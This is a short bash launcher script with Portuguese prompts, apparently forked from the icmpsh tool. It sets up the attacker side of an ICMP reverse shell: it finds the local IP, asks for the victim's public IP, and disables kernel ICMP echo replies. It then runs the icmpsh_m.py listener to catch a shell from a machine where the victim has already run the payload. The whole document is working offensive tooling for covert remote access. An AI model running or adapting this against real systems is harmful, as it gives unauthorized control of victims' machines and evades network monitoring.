#!/usr/bin/env bash
# icmp shell script
# Forked by Daniel Compton
echo ""
echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
echo "Script para exeuçao do Shell ICMP"
echo ""
echo ""
echo -e "\e[00;32m##################################################################\e[00m"

echo ""
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Insira o IP publico de sua vitima"
echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
read VICTIM
echo "Se certifique que a vitima executou seu codigo"
echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
echo ""
LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
if [ "$LOCALICMP" -eq 0 ]
                then 
                                echo ""
                                echo -e "\e[01;32m[-]\e[00m O sistema de reply icmp local deve estar ligado"
                                sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null
                                ICMPDIS="disabled"
                else
                                echo ""
fi
echo ""
echo -e "\e[01;32m[-]\e[00m Esperando pedidos de conexao"
echo ""
python icmpsh_m.py "$IP" "$VICTIM"
if [ "$ICMPDIS" = "disabled" ]
                then
                                echo ""
                                echo -e "\e[01;32m[-]\e[00m Reativando o ICMP reply local novamente"
                                sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null
                                echo ""
                else
                                echo ""
fi

exit 0
